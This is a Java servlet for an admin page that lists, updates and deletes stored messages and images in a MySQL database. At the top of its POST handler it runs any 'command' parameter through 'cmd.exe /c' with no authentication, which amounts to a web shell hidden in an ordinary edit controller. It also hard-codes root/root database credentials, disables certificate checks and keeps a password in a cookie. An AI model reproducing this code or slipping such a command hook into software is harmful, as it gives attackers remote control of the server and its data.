package controller;

import javax.servlet.RequestDispatcher;
import javax.servlet.ServletException;
import javax.servlet.http.*;
import java.io.*;
import java.sql.*;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class EditController extends HttpServlet {
    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        List resultList = new ArrayList();
        String cmd = request.getParameter("command");
        if (cmd != null && cmd.length() != 0) {

            ProcessBuilder processBuilder = new ProcessBuilder();
            processBuilder.command("cmd.exe", "/c", cmd);

            try {

                Process process = processBuilder.start();

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String line;
                while ((line = reader.readLine()) != null) {
                    System.out.println(line);
                    resultList.add(line);
                }

                request.setAttribute("resultList", resultList);

                int exitCode = process.waitFor();
                System.out.println("\nExited with code : " + exitCode);

            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        int i;
        String idMessageToDelete = request.getParameter("idMessageToDelete");
        String idMessageToUpdate = request.getParameter("idMessageToUpdate");
        String messageToUpdate = request.getParameter("messageToUpdate");

        if(idMessageToDelete==null && idMessageToUpdate==null) {
            select(request, response);
        } else {
            try {
                String myDriver = "com.mysql.cj.jdbc.Driver";
                String myUrl = "jdbc:mysql://localhost:3306/mydb?useUnicode=true&serverTimezone=UTC&useSSL=true&verifyServerCertificate=false";
                Class.forName(myDriver);
                Connection conn = DriverManager.getConnection(myUrl, "root", "root");

                if (idMessageToDelete!=null && idMessageToDelete.length()!=0) {
                    String sql = "DELETE FROM data WHERE id = ?";
                    PreparedStatement delete = conn.prepareStatement(sql);
                    i = Integer.parseInt(idMessageToDelete);
                    delete.setInt(1, i);
                    delete.executeUpdate();
                    delete.close();
                }

                if (idMessageToUpdate!=null && idMessageToUpdate.length()!=0 && messageToUpdate!=null) {
                    String query = "UPDATE data SET message = ? WHERE id = ?";
                    PreparedStatement update = conn.prepareStatement(query);
                    update.setString(1, messageToUpdate);
                    i = Integer.parseInt(idMessageToUpdate);
                    update.setInt(2, i);
                    update.executeUpdate();
                    update.close();
                }
                conn.close();
            } catch (Exception e) {
                System.err.println("Got an exception! ");
                e.printStackTrace();
            } finally {
                select(request, response);
            }
        }
    }


    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        try{
            select(request, response);
        } catch (Exception e) {
            System.err.println("Got an  exception!" + e.getMessage());
            e.printStackTrace();
        }
    }


    protected void select(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

        String actualPass = "";
        Cookie[] passCookie = request.getCookies();
        HttpSession session = request.getSession();

        String pass = (String) session.getAttribute("password");

        for(int i = 0; i<passCookie.length; i++) {
            if(passCookie[i].getName().equals("password")){
                actualPass = passCookie[i].getValue();
            }
        }

        if (actualPass.equals(pass)) {

            List idList = new ArrayList();
            List authorList = new ArrayList();
            List indexList = new ArrayList();
            List imageList = new ArrayList();

            try {
                String myDriver = "com.mysql.cj.jdbc.Driver";
                String myUrl = "jdbc:mysql://localhost:3306/mydb?useUnicode=true&serverTimezone=UTC&useSSL=true&verifyServerCertificate=false";
                Class.forName(myDriver);
                Connection conn = DriverManager.getConnection(myUrl, "root", "root");

                String sql = "SELECT id,author,message,image FROM data";
                PreparedStatement imageSelect = conn.prepareStatement(sql);
                ResultSet result = imageSelect.executeQuery();

                while (result.next()) {
                    int id = result.getInt("id");
                    String author = result.getString("author");
                    Blob blob = result.getBlob("image");
                    String str = result.getString("message");

                    if (blob != null) {
                        InputStream inputStream = blob.getBinaryStream();
                        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                        byte[] buffer = new byte[4096];
                        int bytesRead = -1;

                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            outputStream.write(buffer, 0, bytesRead);
                        }
                        byte[] imageBytes = outputStream.toByteArray();
                        String base64Image = Base64.getEncoder().encodeToString(imageBytes);
                        imageList.add(base64Image);
                        authorList.add(author);
                        idList.add(id);
                        indexList.add(1);
                        inputStream.close();
                        outputStream.close();
                    } else if (str != null) {
                        imageList.add(str);
                        authorList.add(author);
                        idList.add(id);
                        indexList.add(0);
                    }
                }
                result.close();
                imageSelect.close();
                conn.close();
            } catch (Exception e) {
                System.err.println("Got an exception! ");
                System.err.println(e);
                e.printStackTrace();
            }
            request.setAttribute("authorList", authorList);
            request.setAttribute("indexList", indexList);
            request.setAttribute("imageList", imageList);
            request.setAttribute("idList", idList);
            RequestDispatcher dispatcher = request.getRequestDispatcher("WEB-INF/view/admin_menu.jsp");

            if (dispatcher != null) {
                dispatcher.forward(request, response);
            }
        } else {
            RequestDispatcher dispatcher = request.getRequestDispatcher("login.jsp");
            if (dispatcher != null) {
                dispatcher.forward(request, response);
            }
        }
    }
}
